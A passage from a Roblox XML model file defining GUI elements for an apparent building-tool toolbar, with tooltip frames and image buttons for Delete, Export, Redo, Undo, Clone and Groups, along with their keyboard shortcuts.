											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1.60000002</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">false</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX0543336CB8A04DF986CCE0E0D19AE3EA">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Text</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>20</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">HELP</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX7D8C5DA6F1FE4DB982A14B0163D58B10">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.699999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Shadow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXFC470341FF1C4D319CB89B0699B828A3">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0.5</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">SelectionButtons</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>245</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>105</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="ImageButton" referent="RBX5C2FC234DB644377869B2CA8D2F566BC">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4283804415</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=142074644</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">DeleteButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX99A7FDDBAB384A5E831130CB1931F53D">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Tooltip</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>-0.300000012</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1.60000002</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">false</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBXCD806DA467C846F7B0F69CFFE0291F82">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Text</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>28</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[DELETE
(Shift + X)]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX5E02C293A1834903AB1AD732BCD6422D">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4283804415</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=142074569</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">ExportButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXBBDEC17B2E2D47D7803375FC87D13EFB">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Tooltip</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>-0.300000012</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1.60000002</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">false</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBXEF7CAD3CDF6243EB8662272FFAC6D2F8">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Text</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>28</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[EXPORT
(Shift + P)]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX1BD0914119E84420985A6903905608FA">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4283804415</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=142074553</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">RedoButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX57284635B8A44F1BB6ACA284AC6B5BE0">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Tooltip</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>-0.300000012</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1.60000002</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">false</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX60FABBEF307840DE9F73F883AF87951A">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Text</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>28</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[REDO
(Shift + Y)]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBXF8FB0FC7FFB7483CAD3DCB1F213AA70C">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4283804415</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=142074557</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">UndoButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX28A620AEC03E4DA69A8684E329701B13">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Tooltip</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>-0.300000012</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1.60000002</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">false</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX4B956CB570D14345A7B422F27E576448">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Text</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>28</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[UNDO
(Shift + Z)]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX11B6F90CA2E24ADA862223A7AFDA0942">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4283804415</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=142074563</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">CloneButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>70</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXEB17A8845D2846DD83178B681FDF5A74">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Tooltip</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>-0.300000012</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1.60000002</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">false</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX23382D41EDE24FC98B14EF55FCFB61E0">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Text</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>28</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[CLONE
(Shift + C)]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX6E9F5F2F40CA411A864CE67245E44C6F">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4283804415</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=160378203</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">GroupsButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>70</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
